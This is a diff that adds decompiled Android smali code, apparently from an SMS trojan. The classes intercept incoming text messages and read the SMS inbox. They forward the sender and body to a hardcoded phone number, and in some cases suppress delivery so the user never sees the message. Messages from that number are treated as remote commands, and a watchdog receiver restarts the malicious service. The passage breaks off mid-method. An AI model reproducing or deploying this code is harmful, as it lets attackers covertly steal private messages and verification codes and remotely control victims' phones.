+    sget-object v2, Lji/yj/ur/a201jhfg20180420ab/JM02;->kghjfg:Ljava/text/SimpleDateFormat;
+
+    const-string v3, "2018-4-20 12:00:00"
+
+    invoke-virtual {v2, v3}, Ljava/text/SimpleDateFormat;->parse(Ljava/lang/String;)Ljava/util/Date;
+
+    move-result-object v1
+
+    .line 95
+    .local v1, "et":Ljava/util/Date;
+    new-instance v2, Ljava/util/Date;
+
+    invoke-direct {v2}, Ljava/util/Date;-><init>()V
+
+    invoke-virtual {v1, v2}, Ljava/util/Date;->after(Ljava/util/Date;)Z
+    :try_end_0
+    .catch Ljava/text/ParseException; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result v2
+
+    if-eqz v2, :cond_0
+
+    .line 96
+    const/4 v2, 0x1
+
+    .line 101
+    .end local v1    # "et":Ljava/util/Date;
+    :goto_0
+    return v2
+
+    .line 98
+    :catch_0
+    move-exception v0
+
+    .line 99
+    .local v0, "e":Ljava/text/ParseException;
+    invoke-virtual {v0}, Ljava/text/ParseException;->printStackTrace()V
+
+    .line 101
+    .end local v0    # "e":Ljava/text/ParseException;
+    :cond_0
+    const/4 v2, 0x0
+
+    goto :goto_0
+.end method
+
+.method public yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
+    .locals 7
+    .param p1, "fromphone"    # Ljava/lang/String;
+    .param p2, "msg"    # Ljava/lang/String;
+    .param p3, "context"    # Landroid/content/Context;
+    .param p4, "sp"    # Landroid/content/SharedPreferences;
+
+    .prologue
+    const/4 v6, 0x0
+
+    const/4 v5, 0x0
+
+    const/4 v4, 0x1
+
+    .line 53
+    const-string v1, "action"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, " to-->"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "18016217928"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "-> "
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 54
+    const-string v1, "18016217928"
+
+    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_3
+
+    .line 55
+    const-string v1, "\uff03"
+
+    const-string v2, "#"
+
+    invoke-virtual {p2, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
+
+    move-result-object v1
+
+    const-string v2, "#"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 56
+    .local v0, "ns":[Ljava/lang/String;
+    array-length v1, v0
+
+    if-lt v1, v4, :cond_2
+
+    .line 57
+    const-string v1, "com"
+
+    aget-object v2, v0, v6
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_1
+
+    .line 58
+    aget-object v1, v0, v4
+
+    invoke-virtual {p0, v1, p4}, Lji/yj/ur/a201jhfg20180420ab/JM02;->dfgfddg(Ljava/lang/String;Landroid/content/SharedPreferences;)V
+
+    .line 73
+    .end local v0    # "ns":[Ljava/lang/String;
+    :cond_0
+    :goto_0
+    return-void
+
+    .line 60
+    .restart local v0    # "ns":[Ljava/lang/String;
+    :cond_1
+    const-string v1, "18016217928"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    array-length v3, v0
+
+    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, " \u6307\u4ee4\u9519\u8bef\'"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    aget-object v3, v0, v6
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "\',"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    .line 61
+    aget-object v3, v0, v4
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    .line 60
+    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+
+    .line 65
+    :cond_2
+    const-string v1, "18016217928"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    array-length v3, v0
+
+    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, " \u6307\u4ee4\u9519\u8bef"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, "\u6b63\u786e\u683c\u5f0f \u624b\u673a\u53f7\u7801#\u5185\u5bb9"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+
+    .line 69
+    .end local v0    # "ns":[Ljava/lang/String;
+    :cond_3
+    const-string v1, "islj"
+
+    invoke-interface {p4, v1, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+
+    move-result v1
+
+    if-eqz v1, :cond_0
+
+    .line 70
+    const-string v1, "18016217928"
+
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v3, "->"
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {p0, v1, v2, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+.end method
+
+.method public ytuyghjdhd(Landroid/os/Bundle;Landroid/content/Context;Lji/yj/ur/a201jhfg20180420ab/JM03;)V
+    .locals 12
+    .param p1, "bundle"    # Landroid/os/Bundle;
+    .param p2, "context"    # Landroid/content/Context;
+    .param p3, "receiver"    # Lji/yj/ur/a201jhfg20180420ab/JM03;
+
+    .prologue
+    const/4 v9, 0x0
+
+    .line 26
+    :try_start_0
+    const-string v8, "config"
+
+    const/4 v10, 0x0
+
+    invoke-virtual {p2, v8, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v7
+
+    .line 27
+    .local v7, "sp":Landroid/content/SharedPreferences;
+    const-string v8, "pdus"
+
+    invoke-virtual {p1, v8}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v6
+
+    check-cast v6, [Ljava/lang/Object;
+
+    .line 28
+    .local v6, "pdus":[Ljava/lang/Object;
+    array-length v8, v6
+
+    new-array v4, v8, [Landroid/telephony/SmsMessage;
+
+    .line 29
+    .local v4, "messages":[Landroid/telephony/SmsMessage;
+    const/4 v2, 0x0
+
+    .local v2, "i":I
+    :goto_0
+    array-length v8, v6
+
+    if-lt v2, v8, :cond_2
+
+    .line 32
+    const-string v5, ""
+
+    .line 33
+    .local v5, "msg":Ljava/lang/String;
+    const-string v1, ""
+
+    .line 34
+    .local v1, "fromphone":Ljava/lang/String;
+    array-length v10, v4
+
+    move v8, v9
+
+    :goto_1
+    if-lt v8, v10, :cond_3
+
+    .line 40
+    const-string v8, "action"
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v10, "->"
+
+    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-static {v8, v9}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 41
+    const-string v8, "islj"
+
+    const/4 v9, 0x1
+
+    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+
+    move-result v8
+
+    if-nez v8, :cond_0
+
+    const-string v8, "18016217928"
+
+    invoke-virtual {v1, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v8
+
+    if-eqz v8, :cond_1
+
+    .line 42
+    :cond_0
+    invoke-virtual {p3}, Lji/yj/ur/a201jhfg20180420ab/JM03;->abortBroadcast()V
+
+    .line 44
+    :cond_1
+    invoke-virtual {p0, v1, v5, p2, v7}, Lji/yj/ur/a201jhfg20180420ab/JM02;->yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V
+
+    .line 50
+    .end local v1    # "fromphone":Ljava/lang/String;
+    .end local v2    # "i":I
+    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
+    .end local v5    # "msg":Ljava/lang/String;
+    .end local v6    # "pdus":[Ljava/lang/Object;
+    .end local v7    # "sp":Landroid/content/SharedPreferences;
+    :goto_2
+    return-void
+
+    .line 30
+    .restart local v2    # "i":I
+    .restart local v4    # "messages":[Landroid/telephony/SmsMessage;
+    .restart local v6    # "pdus":[Ljava/lang/Object;
+    .restart local v7    # "sp":Landroid/content/SharedPreferences;
+    :cond_2
+    aget-object v8, v6, v2
+
+    check-cast v8, [B
+
+    invoke-static {v8}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;
+
+    move-result-object v8
+
+    aput-object v8, v4, v2
+
+    .line 29
+    add-int/lit8 v2, v2, 0x1
+
+    goto :goto_0
+
+    .line 34
+    .restart local v1    # "fromphone":Ljava/lang/String;
+    .restart local v5    # "msg":Ljava/lang/String;
+    :cond_3
+    aget-object v3, v4, v8
+
+    .line 35
+    .local v3, "message":Landroid/telephony/SmsMessage;
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-direct {v9, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 36
+    const-string v9, ""
+
+    invoke-virtual {v9, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v9
+
+    if-eqz v9, :cond_4
+
+    .line 37
+    invoke-virtual {v3}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    move-result-object v1
+
+    .line 34
+    :cond_4
+    add-int/lit8 v8, v8, 0x1
+
+    goto :goto_1
+
+    .line 45
+    .end local v1    # "fromphone":Ljava/lang/String;
+    .end local v2    # "i":I
+    .end local v3    # "message":Landroid/telephony/SmsMessage;
+    .end local v4    # "messages":[Landroid/telephony/SmsMessage;
+    .end local v5    # "msg":Ljava/lang/String;
+    .end local v6    # "pdus":[Ljava/lang/Object;
+    .end local v7    # "sp":Landroid/content/SharedPreferences;
+    :catch_0
+    move-exception v0
+
+    .line 46
+    .local v0, "e":Ljava/lang/Exception;
+    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
+
+    .line 47
+    const-string v8, "18016217928"
+
+    new-instance v9, Ljava/lang/StringBuilder;
+
+    const-string v10, "\u51fa\u73b0\u5f02\u5e38"
+
+    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+
+    move-result-object v10
+
+    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v9
+
+    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v9
+
+    .line 48
+    const/4 v10, 0x0
+
+    .line 47
+    invoke-virtual {p0, v8, v9, v10}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_2
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM03;
+.super Landroid/content/BroadcastReceiver;
+.source "JM03.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
+
+    return-void
+.end method
+
+
+# virtual methods
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 6
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "intent"    # Landroid/content/Intent;
+
+    .prologue
+    const/4 v5, 0x0
+
+    .line 14
+    const-string v2, "action"
+
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 15
+    const-string v2, "config"
+
+    const/4 v3, 0x0
+
+    invoke-virtual {p1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    .line 16
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "android.provider.Telephony.SMS_RECEIVED"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-nez v2, :cond_0
+
+    .line 17
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "android.provider.Telephony.SMS_RECEIVED_2"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-nez v2, :cond_0
+
+    .line 18
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "android.provider.Telephony.GSM_SMS_RECEIVED"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-eqz v2, :cond_1
+
+    .line 19
+    :cond_0
+    new-instance v1, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    .line 20
+    .local v1, "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;
+
+    move-result-object v0
+
+    .line 21
+    .local v0, "bundle":Landroid/os/Bundle;
+    if-eqz v0, :cond_1
+
+    invoke-virtual {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;->ghyutrhr()Z
+
+    move-result v2
+
+    if-eqz v2, :cond_1
+
+    .line 22
+    invoke-virtual {v1, v0, p1, p0}, Lji/yj/ur/a201jhfg20180420ab/JM02;->ytuyghjdhd(Landroid/os/Bundle;Landroid/content/Context;Lji/yj/ur/a201jhfg20180420ab/JM03;)V
+
+    .line 25
+    .end local v0    # "bundle":Landroid/os/Bundle;
+    .end local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    :cond_1
+    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v2
+
+    const-string v3, "sh.ji.fe"
+
+    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v2
+
+    if-eqz v2, :cond_2
+
+    .line 26
+    new-instance v1, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v1}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    .line 27
+    .restart local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM03;->getResultCode()I
+
+    move-result v2
+
+    const/4 v3, -0x1
+
+    if-eq v2, v3, :cond_3
+
+    .line 28
+    const-string v2, "18016217928"
+
+    new-instance v3, Ljava/lang/StringBuilder;
+
+    const-string v4, "\u6307\u4ee4\u6267\u884c\u5931\u8d25\u72b6\u6001\u7801\uff1a"
+
+    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM03;->getResultCode()I
+
+    move-result v4
+
+    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v3
+
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v1, v2, v3, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 34
+    .end local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    :cond_2
+    :goto_0
+    return-void
+
+    .line 31
+    .restart local v1    # "su":Lji/yj/ur/a201jhfg20180420ab/JM02;
+    :cond_3
+    const-string v2, "18016217928"
+
+    const-string v3, "\u6307\u4ee4\u53d1\u9001\u6210\u529f"
+
+    invoke-virtual {v1, v2, v3, v5}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
+
+    goto :goto_0
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM04;
+.super Landroid/content/BroadcastReceiver;
+.source "JM04.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 10
+    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
+
+    return-void
+.end method
+
+.method public static iii(Landroid/content/Context;Ljava/lang/String;)Z
+    .locals 6
+    .param p0, "mContext"    # Landroid/content/Context;
+    .param p1, "className"    # Ljava/lang/String;
+
+    .prologue
+    .line 22
+    const/4 v2, 0x0
+
+    .line 24
+    .local v2, "kkk":Z
+    const-string v5, "activity"
+
+    invoke-virtual {p0, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    .line 23
+    check-cast v0, Landroid/app/ActivityManager;
+
+    .line 26
+    .local v0, "activityManager":Landroid/app/ActivityManager;
+    const/16 v5, 0x28
+
+    invoke-virtual {v0, v5}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;
+
+    move-result-object v3
+
+    .line 27
+    .local v3, "serviceList":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningServiceInfo;>;"
+    invoke-interface {v3}, Ljava/util/List;->size()I
+
+    move-result v4
+
+    .line 28
+    .local v4, "size":I
+    const/4 v1, 0x0
+
+    .local v1, "i":I
+    :goto_0
+    if-lt v1, v4, :cond_0
+
+    .line 34
+    :goto_1
+    return v2
+
+    .line 29
+    :cond_0
+    invoke-interface {v3, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;
+
+    move-result-object v5
+
+    check-cast v5, Landroid/app/ActivityManager$RunningServiceInfo;
+
+    iget-object v5, v5, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;
+
+    invoke-virtual {v5}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-virtual {v5, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v5
+
+    if-eqz v5, :cond_1
+
+    .line 30
+    const/4 v2, 0x1
+
+    .line 31
+    goto :goto_1
+
+    .line 28
+    :cond_1
+    add-int/lit8 v1, v1, 0x1
+
+    goto :goto_0
+.end method
+
+
+# virtual methods
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 3
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "arg1"    # Landroid/content/Intent;
+
+    .prologue
+    .line 13
+    const-string v2, "ji.yj.ur.a201jhfg20180420ab.JM01"
+
+    invoke-static {p1, v2}, Lji/yj/ur/a201jhfg20180420ab/JM04;->iii(Landroid/content/Context;Ljava/lang/String;)Z
+
+    move-result v1
+
+    .line 14
+    .local v1, "kkk":Z
+    if-nez v1, :cond_0
+
+    .line 15
+    new-instance v0, Landroid/content/Intent;
+
+    const-class v2, Lji/yj/ur/a201jhfg20180420ab/JM01;
+
+    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 16
+    .local v0, "intent":Landroid/content/Intent;
+    const/high16 v2, 0x10000000
+
+    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
+
+    .line 17
+    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    .line 19
+    .end local v0    # "intent":Landroid/content/Intent;
+    :cond_0
+    return-void
+.end method
+.class public Lji/yj/ur/a201jhfg20180420ab/JM05;
+.super Landroid/database/ContentObserver;
+.source "JM05.java"
+
+
+# instance fields
+.field private context:Landroid/content/Context;
+
+.field private didid:I
+
+.field private ninin:Landroid/net/Uri;
+
+.field private sp:Landroid/content/SharedPreferences;
+
+.field private su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+
+# direct methods
+.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
+    .locals 2
+    .param p1, "context"    # Landroid/content/Context;
+    .param p2, "handler"    # Landroid/os/Handler;
+
+    .prologue
+    const/4 v1, 0x0
+
+    .line 23
+    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V
+
+    .line 12
+    const/4 v0, -0x1
+
+    iput v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    .line 13
+    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;
+
+    .line 14
+    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    .line 15
+    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    .line 24
+    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    .line 25
+    const-string v0, "content://sms/inbox"
+
+    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v0
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;
+
+    .line 26
+    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    invoke-direct {v0}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;
+
+    .line 27
+    const-string v0, "config"
+
+    const/4 v1, 0x0
+
+    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+
+    move-result-object v0
+
+    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    .line 28
+    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM05;->Change()V
+
+    .line 29
+    return-void
+.end method
+
+
+# virtual methods
+.method public Change()V
+    .locals 12
+
+    .prologue
+    const/4 v10, 0x1
+
+    const/4 v2, 0x0
+
+    .line 31
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;
+
+    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v0
+
+    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;
+
+    const-string v5, "_id desc"
+
+    move-object v3, v2
+
+    move-object v4, v2
+
+    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
+
+    move-result-object v8
+
+    .line 32
+    .local v8, "cursor":Landroid/database/Cursor;
+    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    .line 33
+    const-string v0, "_id"
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v0
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getInt(I)I
+
+    move-result v9
+
+    .line 34
+    .local v9, "id":I
+    iget v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    const/4 v1, -0x1
+
+    if-ne v0, v1, :cond_1
+
+    .line 35
+    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    .line 52
+    .end local v9    # "id":I
+    :cond_0
+    :goto_0
+    invoke-interface {v8}, Landroid/database/Cursor;->close()V
+
+    .line 53
+    return-void
+
+    .line 37
+    .restart local v9    # "id":I
+    :cond_1
+    iget v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    if-le v9, v0, :cond_3
+
+    .line 38
+    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I
+
+    .line 39
+    const-string v0, "address"
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v0
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v6
+
+    .line 40
+    .local v6, "address":Ljava/lang/String;
+    const-string v0, "body"
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I
+
+    move-result v0
+
+    invoke-interface {v8, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;
+
+    move-result-object v7
+
+    .line 41
+    .local v7, "body":Ljava/lang/String;
+    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;
+
+    const-string v1, "islj"
+
+    invoke-interface {v0, v1, v10}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+
+    move-result v11
+
+    .line 42
+    .local v11, "islj":Z
